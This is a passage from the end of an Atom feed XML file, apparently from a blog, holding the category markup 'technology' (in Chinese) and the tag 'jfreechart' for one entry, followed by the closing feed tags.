      <category term="技术" scheme="http://burinicc.cn/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="jfreechart" scheme="http://burinicc.cn/tags/jfreechart/"/>
    
  </entry>
  
</feed>
